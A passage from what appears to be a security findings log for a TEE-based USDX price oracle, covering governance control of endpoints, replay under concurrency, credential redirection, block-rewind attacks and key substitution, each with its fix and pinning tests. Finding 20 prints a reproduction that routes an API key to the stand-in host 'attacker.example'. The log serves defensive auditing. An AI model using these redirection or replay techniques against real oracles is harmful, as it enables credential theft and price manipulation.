the risk in the safe-sounding direction: `0x1111…` has no known private key, so
provisioning would have failed closed, whereas the real values failed open.

---

## 15. The governance key is price-controlling, by decision

**Severity: High. Accepted deliberately — this is a recorded trade, not a defect.**

`SET_ENDPOINTS` carries RPC provider URLs and a per-chain agreement threshold,
both unconstrained. An earlier build bounded URLs with a baked host allowlist
and pinned the threshold; both were removed so that adding a provider (Alchemy,
say) or moving from 2-of-3 to 2-of-4 needs no rebuild and no re-attestation.

**The consequence.** `setEndpoints` is `onlyGovernance` on the sender, so whoever
controls the sender's governance can publish a chain group of one provider at
threshold 1 pointing at a server of their own, have that server return any
`totalSupply()`, and the attested code will faithfully compute and sign the
resulting price. A higher threshold does not help, because the same party
chooses every provider in the list.

So the published price is only as trustworthy as the **sender's governance**, not
as the code hash alone. The attestation still proves which code ran and that the
credentials stayed in the enclave; it no longer proves the inputs came from
anywhere in particular. Anyone relying on this feed has to trust governance as
well as the TEE.

**What this rules out.** The original claim in spec §2 — that consumers can
verify *what* computed the price rather than trusting an operator — is now only
half true. Worth restating in consumer documentation rather than leaving the
spec's stronger wording in place.

**What is still enforced**, and is unrelated to which host is named:

- https only, so a credential is never put on the wire in plaintext and nobody
  on path can dictate a supply figure
- `{secret}` may not appear in a URL's scheme or host, so the credential holder
  cannot change the destination even though the URL author can
- a credential containing `/ ? # &` or whitespace is rejected, so substitution
  cannot restructure a URL
- the backing refs (`hex_api_key`, `hex_cash_url`) may not be named as a chain
  provider's secret, so the URL author cannot choose a destination for the
  credentials whose destination is otherwise fixed — see finding 20
- the cash endpoint must be exactly one PRIVATE entry at threshold 1 naming
  `hex_cash_url`, so its URL is a salted commitment the backing admins must match,
  never a URL the publisher writes in the clear
- threshold must be between 1 and the provider count, so a chain cannot be
  configured to fail on every observation
- every pinned chain must be present, since a missing one undercounts supply and
  therefore *overstates* the price
- token addresses, `MaxBlockAge`, the bonds URL, both metric names, the price's
  decimals and the observation bounds remain pinned and are not expressible in a
  payload; each token's own `decimals()` is read, never configured

**Mitigations available if the trade is later reconsidered:** pin a per-chain
*minimum* threshold so the runtime value can only be raised, or reinstate the
host allowlist. Putting the publisher behind a timelock is already the
production arrangement: a production-mode sender's publications are Flare
governance's timelocked calls. `TestAnyHostIsAccepted` exists so that
reintroducing a constraint means changing a named test rather than silently
altering behaviour.

---

## 16. On-chain configuration was advisory, not binding

**Severity: High. Resolved.**

`setEndpoints` published a configuration and emitted `EndpointsSet(teeId,
keccak256(config))`. That recorded what was **sent**. Nothing recorded, or
required, what a machine was actually **running**.

Three ways they diverge, none of which raised anything:

1. **The extension rejected the payload.** `ApplyEndpoints` validates before
   storing, so a malformed config leaves the *previous* one in force — correct
   behaviour, but the chain still shows the new one.
2. **The instruction was never delivered.** FCC is fire-and-forget: no delivery
   guarantee.
3. **Several machines.** `setEndpoints` named one `teeId`, so N machines meant N
   calls. A machine that never received its call kept running stale
   configuration — and `UsdxPriceStore` accepted a signed price from *any*
   registered machine for the extension, so its prices were equally valid.

The third was the sharpest: every machine reports `ready: true`, and nothing
anywhere reveals that they disagree.

**First resolution (the old contracts).** The signed price report carried
`endpointsHash`, and the store enforced it against a per-machine record:

```solidity
// UsdxOracleInstructionSender.setEndpoints — recorded BEFORE dispatch, so a
// machine that never receives the instruction cannot submit either.
expectedConfigHash[_teeId] = keccak256(_config);

// UsdxPriceStore.submitPrice
bytes32 expected = CONFIG_SOURCE.expectedConfigHash(teeId);
if (expected == bytes32(0)) revert NoConfigPublished();
if (endpointsHash != expected) revert StaleConfig();
```

**Current resolution (upstream's contracts).** The commitment is per feed, not
per machine. Governance publishes one configuration per feed with
`setEndpoints(feedId, groups, claimBack)`, which records
`latestEndpointsHash(feedId)` and dispatches to the extension's whole active set;
`setAdmins` does the same for `latestAdminsHash(feedId)`. Every signed update
carries both hashes, and `TeeOracleFeedStore` requires them to equal the feed's
latest (`NoEndpointsPublished`, `NoAdminsPublished`, `StaleEndpoints`,
`StaleAdmins`). Publishing a new generation therefore invalidates, at once,
every machine still on the previous one, whether or not its instruction has
arrived, until it applies the new one. A machine registered after a publication is
brought up to date by anyone, through the sender's payable `pushEndpoints` /
`pushAdmins`, fed the payload from the `*Published` event; until then
`requestFeedUpdate` refuses to pay for it (`TeeIdNotConfigured`).

Pinned upstream by `testSubmitFeedUpdatesOneSignatureRevertStaleEndpoints` and
`testSubmitFeedUpdatesOneSignatureUndispatchedPublicationInvalidatesMachine`
(`TeeOracleFeedStore.t.sol`), and end to end by
`testPublicationInvalidatesMachinesUntilTheyAdoptIt` and
`testLateMachineConvergesThroughPermissionlessPush` (`TeeOracle.t.sol`).

The TEE already signs the update, so it attests its active configuration in the
same signature. A machine running anything other than what was published cannot
contribute at all — no monitoring, no human, no off-chain comparison.

This makes a claim readable from chain alone that was previously unsupported:
*this price was computed by attested code, running this exact published
configuration.*

**Implementation detail that matters.** The hash is taken over the **raw payload
bytes as received**, never a re-serialisation of the decoded struct. The
payloads are dynamic ABI, and re-encoding a decoded one is not guaranteed to
reproduce the bytes the sender hashed, so a re-encode could fail to match
`latestEndpointsHash` for no reason in the configuration itself
(`TestApply_HashesThePayloadAsReceived`).

**What it does NOT do.** It does not constrain governance, which sets both the
configuration and the expected hash and can keep them consistent while pointing
at anything. It closes divergence, not finding 15.

**Also exposed** in the signed `GET_READINESS` report as
`readiness.endpointsHash` and `readiness.adminsHash`, so an operator can compare
against `latestEndpointsHash(feedId)` without waiting for a price submission.
That field is a convenience; the enforcement is on-chain.

---

## 17. Full audit of logging and error surfaces (2026-08-04)

**Severity: informational. No sensitive disclosure found. Records what was
checked so the next reviewer starts from a known baseline rather than
re-auditing from scratch.**

Finding 1 built the mechanism. This audit walked every site that emits
anything — every `logger` call, every error return, every HTTP response body,
every contract event — to confirm the mechanism is complete and nothing beside
it leaks. The surfaces below are as they stand now.

**Scope and verdict, surface by surface.**

- *Internal logging.* Inside `internal/`, `logger` is imported in exactly three
  files: `extension/extension.go`, `extension/provisioning.go` and
  `observation/poller/poller.go`; outside it, `pkg/server/server.go` and the
  `cmd/` entrypoints. The packages that actually touch secrets and reserve
  figures — `backing`, `supply`, `price`, `observation/decimal`,
  `wire/feedupdate`, `provisioning/envelope`, `provisioning/store`, `teenode` —
  import no logger at all, so the sensitive values have no log path to reach.
  What is logged: action IDs, statuses, the public `Log`, the failure vocabulary,
  port numbers and intervals, the machine's own TEE address, `SET_ENDPOINTS` and
  `SET_ADMINS` validation detail (group and role names, thresholds, versions,
  secret *ref names* and admin addresses — all public on-chain or names rather
  than values), and the fixed string `SET_SECRET rejected` with deliberately no
  cause.
- *ActionResult.Log.* Every refusal reaches it through `refuse()`, whose
  parameter type is `failure.Failure`, not `error` — a raw error cannot be passed
  in even by accident. `failure.Coerce` maps anything else onto the vocabulary at
  the extension and observation boundaries. Pinned by
  `TestProcessGetFeed_ForeignErrorIsNotPublished` (an injected
  `dial tcp …?apikey=SECRET` error surfaces as `internal error`) and
  `TestVocabularyIsPublishable` (rejects digits, URLs, hostnames, quotes and
  credential-words in the vocabulary).
- *GET /state and GET_READINESS.* `GET /state` is empty. The signed readiness
  report carries timestamps, counters, the coarse error class, provisioning state
  (secret ref *names*, never values, and the two configuration hashes) and
  per-source health keyed by positional identifiers (`backing.New` rejects
  URL-shaped names).
- *Signing/decrypt round trips.* `teenode.post` returns vocabulary values
  only; the failed-decrypt response body is dropped because it could carry key
  material. `backing.fetchOnce` drops the `*url.Error` that embeds the request
  URL with any query-string credential. `decimal` errors never quote their
  input, and the input is dropped anyway, because the input is the reserve
  figure.
- *Contract events and reverts.* Events carry the price (the intended public
  output), timestamps, addresses, the configuration hashes, and the published
  endpoint groups and admin roles. The endpoint payload is public by construction
  (it arrives by on-chain instruction) and carries URLs with `{secret}`
  placeholders, ref names and, for the cash endpoint, a salted commitment, never a
  credential value or the restricted URL. Reverts are custom errors.
- *Operator tooling.* `send-endpoints`, `send-admins` and `send-secret` print
  addresses, refs, versions, hashes and expiry — nothing secret. `send-secret
  build` prints metadata about the envelope but never the credential, which
  exists in plaintext only inside the target TEE.

**What remains, recorded rather than leaked.**

1. *HTTP-level error bodies are not vocabulary-controlled.* `decoding action:
   %v`, `decoding fixed data: %v`, `decoding direct instruction: %v`, the 400
   unknown-action-type and action-id messages, and the 501 unsupported op type
   and command messages are formatted for the direct HTTP peer, and tee-node
   turns a non-200 into an error that lands in `ActionResult.Log`, so they **do**
   reach that public surface. Their content is the caller's own input and
   constants of this build, never the machine's state, so this is not a
   disclosure; it is recorded so nobody assumes the closed-vocabulary property
   extends to raw HTTP bodies.
2. *Credentials on argv* — resolved. `send-secret` reads the credential from
   `SECRET_VALUE` (or `HEX_CASH_URL`/`HEX_CASH_SALT` for the cash URL) and the
   admin key from `ADMIN_KEY`, never from flags, and the scripts export
   `DIRECT_API_KEY` rather than passing `-directApiKey`.

One inaccuracy was found and corrected during the audit: the `SET_ENDPOINTS`
rejection comment in `provisioning.go` claimed the error detail names hosts;
the `provisioning/store` errors actually carry chain names, thresholds and secret ref
names. No host ever appears, which is the safer direction.

---

## 18. The report's target binding was removed pre-launch

**Severity: informational. A deliberate simplification, recorded so the absence
is a documented decision rather than an oversight.**

> **Superseded by the move to upstream's contracts (2026-08).** The signed update
> binds the chain, the extension and the feed again: `FeedUpdate` carries
> `extensionId` and `feedId`, which the store checks against its own
> (`WrongExtensionId`, `WrongFeedId`), and the signed envelope is upstream's
> `SignedPayload(bytes32("TEE_ORACLE_FEED"), chainId, dataHash)`, so `chainId`
> is covered by the signature. There is no store address and no instruction id:
> correlation is tee-node's action id, outside the signature, and replay is
> covered by the strictly increasing `observedAt` and the feed binding. The
> enclave refuses a `GET_FEED` naming another feed before observing. Pinned by
> `TestChainIDIsBound` and `TestFeedBindingIsInTheDigest` (`pkg/wire/feedupdate`),
> `TestProcessGetFeed_RequiresTheRequestEnvelope`, and upstream's
> `testSubmitFeedUpdatesOneSignatureRevertWrongExtensionId` and
> `testSubmitFeedUpdatesOneSignatureRevertWrongFeedId`. Rationale §7 has the
> current format. What follows is the decision as it stood under the old
> contracts.

The signed report originally carried `chainId`, `store` and `feedId`, and the
store verified each against itself. All three were removed before launch. The
payload became `(domain, price, decimals, observedAt, instructionId)`.

**Why they were weaker than they looked.** The store's acceptance gate is the
registered-machine check: a signature is only ever accepted from a TEE machine
currently registered to the store's extension. That check proves the price was
computed by attested code from the configured sources regardless of what the
payload binds. The binding fields never protected the price itself — only
*where a correctly-signed price could be delivered*:

- `feedId` was redundant outright: the store binding already determined the
  destination. (`FEED_ID` was subsequently removed from the store as well — see
  the note at the end of this finding.)
- `store` blocked replay into other deployments under the same extension id —
  including deployments governance did not intend — but such a replay still
  delivers a genuine TEE price, never a forged one.
- `chainId` blocked cross-chain replay, which additionally requires a machine
  key to be registered in two networks' registries — a platform invariant the
  deployment model (one chain per machine) already makes unlikely.

**What was accepted in exchange.** Two operational invariants, carried by
governance rather than enforced by the contract: one intended store deployment
per extension (a second deployment under the same extension id accepts the
same genuine reports until paused), and machine keys staying on one network.
Nobody can publish a wrong price either way. The first still holds in the
current model, per feed: a second store for the same feed id under the same
extension would accept the same updates.

**What changed with it.** The store address left the extension's embedded
config (schema v5 dropped `target`; the chain id stayed, because provisioning
envelopes still bind to it), `extension-setup.sh` stopped writing a deployed
address into the config, and the image no longer needed the store deployed
before it was built.

**Follow-up: `FEED_ID` removed from the store too.** It was written in the
constructor and never read there; its only consumer anywhere was a
`FeedMismatch` guard in `UsdxCustomFeed`'s constructor. That guard could not
earn its keep. `FtsoV2.addCustomFeeds` and `FtsoV2.replaceCustomFeeds` take no
feed id argument — both read `feedId()` off the contract being registered — so
the adapter was the sole authority on the id and the store's copy was never
consulted by anything. (Upstream's `TeeOracleFeedStore` is itself the custom
feed, with no separate adapter, and its `feedId` is that sole authority.)

---

## 19. Concurrent provisioning bypassed the replay defence entirely

**Severity: High. Resolved.**

`provision.Verifier` keeps `lastVersion[ref]` in a plain map and documented
itself as "not safe for concurrent use; the extension serialises handler
invocations, so the caller already holds a lock."

**No such lock existed.** `/action` is an ordinary `net/http` handler, so
tee-node delivering two direct actions at once runs two `ApplySecret`
goroutines. `store.Store` took `s.mu` only around the `s.secrets` write,
well after `Verify` had already read and written the version map.

Two consequences, and the second is the serious one:

- **Concurrent map write.** In Go this is a hard runtime throw, not a
  recoverable panic — the process dies. Inside a TEE that is a restart, and
  since credentials are memory-only, a restart drops every secret.
- **The replay defence did not hold.** The version check is read-then-write
  across `Verify`. Run unserialised, every goroutine reads the same old version
  and each concludes it is newer. Measured with the lock removed, **one captured
  envelope submitted 8 times in parallel was accepted 8 times**:

  ```
  --- FAIL: TestApplySecret_ConcurrentReplayAdmitsExactlyOne
      8 of 8 replays accepted, want exactly 1
  ```

  `version` was documented as blocking in-session rollback. Against a parallel
  submitter it blocked nothing. The 15-minute `issuedAt` window of the time still
  bounded the exposure, so an attacker needed an envelope less than 15 minutes
  old — but within that window the defence was bypassable by firing concurrently
  rather than sequentially.

**Resolution.** `store.Store` gained a dedicated `applyMu`, held across the
whole of `ApplyEndpoints`, `ApplyAdmins` and `ApplySecret`, so the verifier is
never entered concurrently.

Two locks rather than one, deliberately. `s.mu` is also taken by `Readiness` and
`Open`, and `ApplySecret` makes a tee-node round trip (`Decrypt`); holding `s.mu`
across it would let a hung `/decrypt` freeze the readiness report and every
observation. `applyMu` covers the verifier for the whole call, `s.mu` stays a
short-critical-section data lock, and the order is always `applyMu` → `mu`.

Pinned by `TestApplySecret_ConcurrentReplayAdmitsExactlyOne`, the security
property: one envelope submitted 8 times concurrently, exactly one accepted. And
by `TestApplySecret_IsSafeUnderConcurrency`, which applies 8 different versions
at once and, under `go test -race` (as CI runs it), catches the unsynchronised map write. The
`Verifier` doc comment names `applyMu` as the serialising caller instead of
asserting a lock that was never there.

---

## 20. The publisher could redirect the Hex API key into a URL of their choosing

**Severity: High. Resolved.**

Finding 2 rates disclosure of the Hex credential High and hardens
`backing.New()` against redirects to protect it. Finding 15 accepts that the
publisher can name any RPC host. Neither noticed what the two imply together.

`Provider.Secret` is payload-controlled and was looked up in the *same* secret
store that holds the backing credential:

```go
url, err := resolveURL(p.URL, p.Secret, s.secrets[p.Secret])
```

Nothing stopped a `SET_ENDPOINTS` payload naming `hex_api_key` as an RPC
provider's secret. Reproduced against the real decoder:

```
step 1: payload ACCEPTED — hex_api_key is usable as a provider secret
step 2: resolved URL = https://attacker.example/collect/SUPER-SECRET-HEX-KEY
```

Normally that credential travels as an **auth header** to the cash endpoint and
never leaves it. Through this path it travelled in the **URL path** of a host the
payload author chose, on the next observation.

**What this changed about finding 15.** That finding reasons entirely about
price control, and its enforced-list says `{secret}` cannot appear in scheme or
host "so the credential holder cannot change the destination even though the URL
author can" — treating the URL author as trusted with destinations. But the URL
author and the credential holder are different parties by design. The real blast
radius of a publisher compromise was therefore larger than recorded: not only
can the holder set the price, they can **harvest every provisioned credential**,
including the one finding 2 goes to some length to protect. That strengthens the
case for a timelock on the publisher, which production-mode senders have.

**Resolution.** `validate()` rejects any chain provider naming a backing ref as
its secret — both `hex_api_key` and, since the cash URL became a provisioned
value, `hex_cash_url` (`protocol.IsBackingRef`). This is the URL-ref / auth-ref
split of finding 14 enforced at the boundary rather than left to convention, and
it matters most for these refs because their destination is otherwise fixed —
the cash URL by governance's commitment — and so not the publisher's to choose.

Note this does **not** stop the publisher exfiltrating *RPC* credentials — those
are inherently sent to publisher-chosen hosts, which is the accepted trade in
finding 15. It closes the cross-purpose case, where a credential issued for a
fixed endpoint is redirected somewhere else entirely.

**Related hardening in the same pass.** `&` was missing from the rejected
credential character set, so a credential substituted into a query *value*
(`?key={secret}`) could append parameters of its own. The set now lives in one
`urlUnsafe` constant used by both checkpoints — `ApplySecret` on arrival and
`resolveURL` at substitution. Two hand-copied security-relevant character sets
was itself the latent bug: the one that drifts is the one that stops matching.

Pinned by `TestSetEndpoints_RejectsBackingCredentialAsProviderSecret` (every
backing ref), and by `TestApplySecret_RejectsCredentialThatWouldAlterAURL` and
`TestResolveAgainst_RejectsSecretThatWouldAlterURL`, whose cases include `&`.

---

## 21. Truncation froze the feed below par on a rounding artifact

**Severity: Medium.** The feed prints a depeg that has not happened, and — with
the cash source unavailable — publishes nothing at all.

**Measured 5 Aug 2026**, against live sources:

| | value |
| --- | --- |
| supply, Flare + Ethereum + Songbird | 25,452,544.524018 |
| `current_reserves_amount` | 25,452,544.52 |
| B − S | **−0.004018** |
| B / S | 0.9999999998 |

Hex quotes the reserve figure **to the cent**; supply carries 6 decimals on
Flare and Songbird and 18 on Ethereum. The published bond figure is therefore
supply with up to $0.01 of quantisation removed, and it sits below supply for
roughly half of all observations for no economic reason whatsoever.

Under truncation that lands as `99999999` — 0.99999999, a printed depeg caused
entirely by Hex's number formatting. Finding 6's argument (an error that can
only ever understate) is correct, but the quantity it was protecting against
turns out to be $0.004 on a $25.4M float.

**Resolution: round half-up.** `⌊x·10^8 + ½⌋`. The shortfall this can conceal is
bounded by construction at half a unit in the last place — **$0.127** at current
supply, or 5e-9 of the float — while worst-case cent quantisation is $0.0099, so
the artifact is absorbed with a 12× margin. Nothing material is affected: a 1%
depeg still prints as `99000000`, pinned by
`TestCompute_RoundingCannotHideAMaterialShortfall`.

The exact arithmetic is what makes the bound trustworthy. `big.Rat` throughout,
including the ½ — `TestCompute_RoundingBoundaryIsExact` uses a ratio a float64
would push over the boundary and publish as par.

### The cash-less observation rule

The same finding unblocked the availability question. The restricted cash
endpoint has one URL and one credential, and until Hex issues a key there is no
cash figure at all. `observation.Observe` therefore accepts a nil cash source,
and `price.ComputeWithoutCash` decides what may be published:

> Publish only when the bonds-only price already reaches par. Cash is
> non-negative and the price is capped at par, so if bonds alone reach par then
> the complete computation reaches par too. The published number is provably the
> one a full observation would have produced.

Everything else fails closed with `BackingUnavailable`. This is **not** the
graceful degradation `usdx-oracle-availability.md` argues against, and the
difference is the whole point: degradation would publish `min(1, R_bonds/S)`
whenever cash was missing — at `R_bonds = 0.99·S` that is 0.990 against a true
0.998, dropping exactly the buffer that decides whether a depeg prints, with
nothing in the signed payload to say so. Here that case publishes nothing.

The rule only has teeth because of the rounding change: at 0.9999999998 the
bonds-only price reaches par under rounding and did not under truncation. Cash
at $205,304 is 806,615 units in the last place, six orders of magnitude beyond
what rounding can absorb — so this admits the quantisation artifact and nothing
else. Pinned by `TestComputeWithoutCash_MatchesTheFullComputation`, which asserts
equality against the full formula for every non-negative cash figure.

The readiness report's `sourceHealth` shows the source as `not_configured`
rather than omitting it — finding 8's rule, applied to a source that is absent by
provisioning rather than by outage. `Readiness.Ready` stays false while the key
or the cash URL is missing: a machine that can answer for only part of the price
range must not claim to be provisioned.

---

## 22. `requestPriceUpdate()` could never dispatch: the registry rejects an empty message

**Severity: High.** The instruction path did not work at all. No price could ever
have reached the chain.

Found on Coston2, 5 Aug 2026, the first time the on-chain request path was
exercised end to end. `requestPriceUpdate()` reverted with `0x3b06a1be` —
`MessageEmpty()` — from `TeeExtensionRegistry.sendInstructions`.

The contract passed `message: ""`, because the observation needs nothing from
the caller. The registry requires a non-empty message. The controlled
comparison is clean: `setEndpoints` sends a non-empty config and had been
delivered and applied minutes earlier on the same machine.

**Why it survived until then.** `git log -S` puts the empty message in the
contracts' first commit (`05c1692`). Nothing had ever called it on-chain: the
only caller was `run-test`, which was failing earlier in the flow — it still
JSON-decoded the Phase-2 stub shape, so it never got as far as dispatching a
second instruction against a real machine. Two latent defects hid each other.

The two sides were also in direct contradiction: the registry demands a
non-empty message, and the price handler rejected *any* non-empty payload with
`UnexpectedPayload` — deliberately, so that no caller could depend on a field
the extension silently drops.

**First resolution: a fixed one-byte request envelope**, `GET_PRICE_REQUEST_V1 =
hex"01"` in the sender, `config.GetPriceRequestV1` in the extension. The handler
required exactly that value and rejected everything else, so the no-silent-drops
rule survived intact — "exactly this known envelope" rather than "nothing at
all" — and a future envelope version could not be mistaken for that one.

**Current resolution.** Upstream's sender serves every feed of an extension, so
`requestFeedUpdate(feedId, teeIds)` dispatches `GET_FEED` with
`abi.encode(FeedUpdateRequest(feedId))`, one word. `feedupdate.DecodeFeedRequest`
requires exactly that length and a non-zero id, and the handler requires the id to
be this build's feed; anything else is `UnexpectedPayload`, echoed nowhere. Pinned
by `TestProcessGetFeed_RequiresTheRequestEnvelope`, which accepts this feed's
request and refuses an empty message, the old one-byte envelope, another feed on
this extension, the zero feed id, a short word and a trailing word, and by
conformance fixtures 01 and 03.

**Incidental, since resolved:** `setExtensionId()` on a freshly deployed sender
was called only by `run-test`, never by a deploy script, so a new sender reverted
`Extension ID is not set.` until someone ran the test tool. Upstream's sender
takes its extension id at initialisation.

---

## 23. An observation cannot fit in the 2 seconds tee-node allows

**Severity: High.** Every price request timed out; the extension's answer was
discarded before it could be relayed.

Found immediately after finding 22 was fixed — the instruction dispatched, and
the result came back `status 3`:

```
Post "http://localhost:7702/action": context deadline exceeded
```

tee-node gives an extension **2 seconds** to answer any action:

```go
// tee-node@v0.0.18 internal/extension/extension.go
client := http.Client{Timeout: settings.ProxyTimeout}   // const ProxyTimeout = 2 * time.Second
```

It is a `const` in an `internal/` package: not an env var, not a config field,
and unreachable from this module; it is unchanged in the tee-node pinned now
(`internal/settings/settings.go`). Measured against live sources on 5 Aug 2026,
from a well-connected host, a complete observation takes **2.0–2.9s** — two
supply rounds across three chains, two Hex fetches, and a signing round trip,
with `HTTPTimeout` alone at 5s per upstream attempt. Inside the container it was
worse. There is no configuration of the synchronous design that fits.

**Resolution: observe on a timer, sign on demand.** `internal/observation/poller`
runs `observation.Observe` every `ObservationInterval` (2 min) and keeps the
latest result; a feed request calls `Poller.Report`, which signs that observation
— one signing round trip, milliseconds. At the time the signature bound the
requesting instruction id; it now binds the requesting instruction's block
timestamp as `observedAt`, and no request identifier (§18). `Observe` does not
sign, and `Observation` carries the binding (`EndpointsHash`, `AdminsHash`) so a
later signature commits to the configuration in force *when the inputs were
read*, not whatever is current when the request arrives.

**What this does not change.** Every freshness guard that still exists survives
it — `checkWindow` across inputs, `MaxObservationAge` on the cache, measured
both by the machine's clock and by the request's block timestamp. (The signed
`observedAt` was later made the request's block timestamp itself, as the store
defines the field — see rationale §3; the reading's own time stays on the
observation.) (The backing bounds referred to here —
`BackingMaxAge`, later split into `BondsMaxAge` / `CashMaxAge` — were removed on
17 Aug 2026 for an unrelated reason: the sources are event-driven, so age
carries no information about correctness. See
[usdx-oracle-failure-modes.md](usdx-oracle-failure-modes.md).)

**What it adds.** A cache introduces a staleness mode the request-time design did
not have, so `MaxObservationAge` (10 min) bounds it: past that, the request is
refused with `ObservationStale` and nothing is published, letting the on-chain
value age visibly. At a 2-minute interval that tolerates four consecutive failed
observations. A single failure does **not** discard the cached observation —
one flapping RPC provider must not stop a feed whose price is still fresh —
but health does reflect the failed attempt, which is the only signal an operator
gets while a cached price is still being served.

Two new vocabulary entries, both publishable: `NoObservation` (asked before the
first round completed) and `ObservationStale`. Pinned by
`TestReport_SignsTheCachedObservation`, `TestLatest_FailsClosedWhenStale`,
`TestReport_DoesNotSignAStaleObservation` and
`TestRecord_FailureKeepsTheLastGoodObservation`.

**Worth raising upstream:** 2 seconds is a tight budget for any extension that
talks to an external source, and it is not discoverable — it presents as a
`status 3` result with a client-timeout string, not as a documented limit.

**Verification status (5 Aug 2026).** The fix was built and covered by unit,
conformance and contract suites, and the latency it removes was measured
directly. It was not yet confirmed on-chain that day: the Coston2 run stopped
before the first submission because the machine could not reach PRODUCTION — the
availability proof needs the TEE proxy reachable from outside, and the ngrok
tunnel fronting it went down.

---

## 24. One RPC provider could rewind the observation to an old block

**Severity: High. Resolved 2026-08-12; the step down added 2026-09-17.**

`agreedBlock` took the **minimum** head across providers and required only that
`Quorum` of them answered. Quorum protected the supply *value*; nothing
protected the *block selection*.

So one provider — a hijacked DNS entry, a compromised endpoint, or just a buggy
node — answers "what block are you at?" with a number from two weeks ago. The
minimum wins, every provider is then asked for `totalSupply()` at that old
block, and the honest ones answer **honestly and identically**, because a read
at a fixed block is deterministic. Quorum passes. The TEE signs a stale supply
figure.

The sharp part: the malicious provider never lies about the supply. It lies
about *which question to ask*, and the honest majority corroborates the answer.

**Nothing downstream caught it.** Every other freshness check was wall-clock.
`checkWindow` compares `RetrievedAt` — when the HTTP calls happened — and the
store compared the report's timestamp against `block.timestamp`. Reading ancient
data one second ago passes all of them.

**Direction of error.** Rewinding to when supply was lower understates supply,
which **overstates** the price — the direction mint/redeem dynamics does not
cap.

**Counter-intuitively bounded by retention.** A shallow provider (publicnode
keeps ~64 blocks) simply fails the old-block query, and if enough fail the read
drops below quorum and fails closed. Adding archive-class providers for
reliability quietly *widens* the attack window.

### Resolution — three changes, because none covers the others

**1. The Quorum-th highest head, not the minimum.** Heads are sorted descending
and the `Quorum`-th is pinned: the highest block at least `Quorum` providers
claim. Block selection now obeys the same rule as the values it precedes, so
`Quorum-1` liars cannot move it. Providers below the pinned block fail their
calls and do not contribute, which is exactly what `Quorum < len(Providers)`
exists to absorb; they are recorded as `lagging` rather than silently ignored.

This buys nothing when `Quorum == len(Providers)` — the order statistic
degenerates to the minimum — which includes `coston2.json`'s Songbird at quorum 1.

**2. `MaxBlockAge`, a pinned per-chain bound on the pinned block's own header
timestamp.** Flare and Songbird 2 min, Ethereum 3 min. This is the check that
works at any quorum, including one provider, and the only one that notices a
chain that has simply stopped. Sized as a large multiple of normal block age
rather than a tight bound: the attack is a rewind of hours or weeks, so being
generous costs only a little detection latency on a stalled chain, while being
tight would reject healthy observations.

It is **pinned, not configurable**. Letting the governance key that already
chooses the providers (finding 15) also choose how stale a block from them may be
would hand over the check together with the attack.

**The timestamp is voted on.** Taking it from whichever provider proposed the
block would give a liar both halves — an ancient block number paired with a
fresh timestamp — defeating `MaxBlockAge` while the honest providers corroborate
the stale supply at that block. A header at a fixed height is deterministic, so
`Quorum` identical timestamps are required, exactly as for the values.

**3. Step down through the claimed heads.** A head is a claim, not proof. Once
the pin was the Quorum-th highest, one provider *overclaiming* its head pushed the
pin onto a block only one honest provider could serve, and the vote there was one
honest answer against one forged — a tie, which is no agreement — so a single
provider could deny every round. The read now walks down through the distinct
claimed heads below the first candidate until `Quorum` providers serve one. Only a
shortfall of corroboration steps; a stale block, a malformed answer or a spent
deadline fails on the spot, since a lower block answers none of them. Each
candidate is scored on its own copy of the providers' health, so the provider the
overclaim displaced is not blamed. The winning answer must also be unique: a tie
counts as no agreement, or provider order would pick the supply figure. Pinned by
`TestRead_OverclaimedHeadDoesNotDenyTheRound`,
`TestRead_ProviderDisplacedByAnOverclaimIsNotBlamed` and
`TestRead_StaleBlockDoesNotWalkDown`; changes 1 and 2 by
`TestRead_OneProviderCannotRewindTheObservation`, `TestRead_RejectsAStaleBlock`
and `TestRead_BlockTimeMustReachQuorum`.

**Not the removed `FinalityMargin`.** That was a depth *below* the head, dropped
2026-08-11 after measurement showed it bought no availability. `MaxBlockAge`
bounds the *freshness of the chosen block* — a different property, and one that
measurement never covered.

**Not folded into `checkWindow`.** The obvious move is to add the block
timestamp to the observation window, and it is wrong at the current setting:
`ObservationWindow` is 30s and measures read skew between `RetrievedAt` stamps,
while Ethereum's head is routinely 12s or more behind wall-clock. Most of the
budget would go on ordinary block age and healthy observations would flap.
`Reading.BlockTime` is exposed for anything that wants it; `MaxBlockAge` bounds
the quantity directly instead.

---

## 25. Verification proved a key that nothing was encrypted to

**Severity: High. Found 2026-08-15 during an audit of the provisioning flow.
Resolved the same day.**

`verify-tee` is built around the right insight, and its header comment states it
well: reading a code hash out of a proxy's own `/info` proves nothing, because
the same untrusted source supplied both halves. What breaks the circularity is
that the `teeId` is **derived** from the attested public key, and the chain
records which `teeId`s are registered, at what status, and which code hashes
their extension accepts. Substitute the key and the derived `teeId` stops
matching a registered machine.

That argument is sound. It just did not reach the encryption.

`verify-tee` and `send-secret build` are **separate processes making separate
requests**. The upload scripts ran the first, and then the second re-fetched
`/info` on its own and encrypted the credential to whatever public key came
back — with no attestation parsing, no signature check, and nothing carried over
from the verification that had just passed. An endpoint that served an honest
key to the gate and a substituted one a moment later received the plaintext.

**The `-tee` flag made it worse rather than better.** It was documented as
"override the teeId from `/info`", and it did exactly that: it replaced the
envelope's `TeeID` field while leaving the encryption pointed at the served key.
So passing the *correct* machine id produced a credential encrypted to the
attacker and an envelope naming the honest machine. The target would fail to
decrypt, the upload would look like an ordinary rejection, and nothing anywhere
would record where the plaintext actually went.

### Resolution

`-tee` is now an **assertion, never an override**. `build` derives the address
from the key it was served and refuses outright if it differs, before any
encryption happens — so no ciphertext is produced for a substituted key and no
envelope reaches disk.

`verify-tee` grew `-printTeeId`, which writes the attested `teeId` to stdout
and moves the human report to stderr. Both upload scripts capture it and pass it
to every `build`. The human report is moved rather than suppressed on purpose:
suppressing it would make the scripted path the one nobody watches. `verify-tee`
also requires the machine's on-chain extension id to be the expected one, and
takes the code hash and platform from the registry's record of the machine
rather than from the token.

Nothing was using `-tee` before this change, so tightening it broke no caller.
The `--no-verify` paths pass no `-tee` at all and say plainly that the
encryption is unpinned — they exist for a mocknode, which has no attestation to
pin to.

**What this does not fix.** A credential is still encrypted to a key fetched
over whatever transport the operator names; the scripts take `PROXY_URL` from
`EXT_PROXY_URL` and otherwise offer `http://localhost:6674`. Verification now
travels with the request, which is the load-bearing half; TLS to a real proxy is
the other, and is a deployment property rather than a code one.

---

## 26. `SET_SECRET` was the one provisioning command with no size bound

**Severity: Medium. Found 2026-08-15 during the same audit. Resolved the same
day.**

`ApplyEndpoints` and `ApplyAdmins` both open with a length check against
`maxPayloadBytes`. `ApplySecret` did not, and it is the one that needs it most:
the other two arrive over the instruction channel behind the sender's
